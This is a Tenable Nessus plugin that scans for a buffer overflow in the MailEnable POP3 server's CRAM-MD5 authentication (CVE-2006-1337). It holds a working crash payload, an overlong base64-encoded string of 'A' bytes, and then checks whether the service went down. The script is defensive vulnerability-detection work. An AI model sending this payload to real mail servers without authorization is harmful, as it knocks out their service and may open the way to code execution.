#
# (C) Tenable Network Security
#


if (description)
{
  script_id(21117);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-1337");
  script_bugtraq_id(17162);

  script_name(english:"MailEnable POP3 Server Authentication Vulnerabilities");
  script_summary(english:"Tries to crash MailEnable POP3 Server");

  desc = "
Synopsis :

The remote POP3 server is affected by two authentication issues. 

Description :

The remote host is running MailEnable, a commercial mail server for
Windows. 

The POP3 server bundled with the version of MailEnable on the remote
host has a buffer overflow flaw involving authentication commands that
can be exploited remotely by an unauthenticated attacker to crash the
affected service and possibly to execute code remotely. 

In addition, it reportedly has a cryptographic implementation mistake
that weakens authentication security. 

See also :

http://lists.grok.org.uk/pipermail/full-disclosure/2006-March/044229.html
http://www.mailenable.com/hotfix/default.asp

Solution :

Apply the ME-10011 hotfix or upgrade to MailEnable Standard Edition
1.93 / Professional Edition 1.73 / Enterprise Edition 1.21 or later

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);
 
  script_category(ACT_DENIAL);
  script_family(english:"Gain root remotely");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("find_service_3digits.nasl", "doublecheck_std_services.nasl");
  script_require_ports("Services/pop3", 110);

  exit(0);
}


include("misc_func.inc");
include("pop3_func.inc");


port = get_kb_item("Services/pop3");
if (!port) port = 110;
if (!get_port_state(port)) exit(0);


# Make sure banner's from MailEnable and APOP is enabled.
banner = get_pop3_banner(port:port);
if (!banner) exit(0);
if (!egrep(pattern:"^\+OK .+ MailEnable POP3 Server <.+@.+>", string:banner)) exit(0);


# Establish a connection.
soc = open_sock_tcp(port);
if (!soc) exit(0);

s = recv_line(socket:soc, length:1024);
if (!strlen(s))
{
  close(soc);
  exit(0);
}


# Try to exploit the flaw to crash the service.
c = "AUTH CRAM-MD5";
send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:1024);
if (strlen(s) && s =~ "^\+ ")
{
  c = string(crap(data:"A", length:400), "@", get_host_name(), " AAAAAAAAAAAAAAAAAAAAA");
  c = base64(str:c);
  send(socket:soc, data:string(c, "\r\n"));
  s = recv_line(socket:soc, length:1024);
  close(soc);

  if (!strlen(s)) {
    sleep(5);

    # Try to reestablish a connection and read the banner.
    soc2 = open_sock_tcp(port);
    if (soc2) s2 = recv_line(socket:soc2, length:1024);

    # If we couldn't establish the connection or read the banner,
    # there's a problem.
    if (!soc2 || !strlen(s2)) {
      security_warning(port);
      exit(0);
    }
    close(soc2);
  }
}
